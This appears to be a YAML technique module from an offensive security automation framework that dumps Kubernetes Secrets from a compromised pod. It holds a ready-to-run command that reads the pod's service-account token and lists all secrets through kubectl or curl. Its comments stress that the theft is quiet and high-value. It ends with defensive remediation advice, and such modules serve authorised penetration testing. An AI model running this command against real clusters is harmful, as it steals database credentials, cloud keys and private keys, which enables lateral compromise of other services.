# Kubernetes Secrets dump via the API
#
# Once RBAC self-check reveals `get/list secrets` on a namespace
# (or cluster-wide), one API call dumps every Secret in that
# scope. Kubernetes Secrets typically hold:
#
#   * database credentials (passed as env vars to app pods)
#   * cloud provider API keys (AWS access keys, GCP service-account JSON)
#   * TLS private keys (used by ingress controllers)
#   * OIDC / OAuth client secrets
#   * dockerconfigjson pull creds for private registries
#
# Every one of those is a lateral primitive out of the cluster.
# Fires when has_k8s_token is set — read-only, quiet, and one of
# the highest operator-value moves on any k8s foothold.
technique: T1613
name: Kubernetes Secrets dump via API
tactic: [credential-access, discovery]
platform: [linux]
key: 'container:k8s-secrets-dump'
ranking:
  exploitability: medium           # depends on RBAC granting `get secrets`
  safety: read-only
  detection: quiet                  # GET on /api/v1/secrets is normal traffic
detect:
  facts_match:
    has_k8s_token: true
execute:
  # kubectl if available; raw API fallback for BusyBox pods.
  # `-A` (all namespaces) surfaces the whole cluster's secret
  # surface when RBAC allows it; the query narrows automatically
  # when it doesn't.
  command: |-
    kubectl get secrets -A -o json 2>/dev/null | head -100 || (TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets" | head -50)
verify:
  success: "kind"
cleanup:
  command: ""
report:
  vector_type: container_escape
  evidence: "in_container + has_k8s_token → Secrets API reachable"
  description: >
    Kubernetes Secrets store credentials as base64-encoded blobs
    in etcd; the API GET returns them decoded on request. A pod
    whose ServiceAccount has `get secrets` on any namespace can
    dump every Secret in that scope — database credentials,
    cloud API keys, TLS private keys, OIDC secrets, private
    registry pull tokens. Each is a lateral-movement pivot OUT
    of the cluster; the cluster foothold becomes a compromise
    of every service the app talks to.
  remediation: >
    Restrict `get secrets` in RBAC to the ServiceAccounts that
    genuinely need it (typically only the operators + specific
    controllers). Prefer external secret stores (Vault, AWS
    Secrets Manager, GCP Secret Manager) with short-lived
    tokens over long-lived Kubernetes Secrets. Enable
    encryption-at-rest for etcd so a control-plane compromise
    doesn't hand over every historical Secret.
  refs: [T1613, kubernetes-secrets, credential-access]
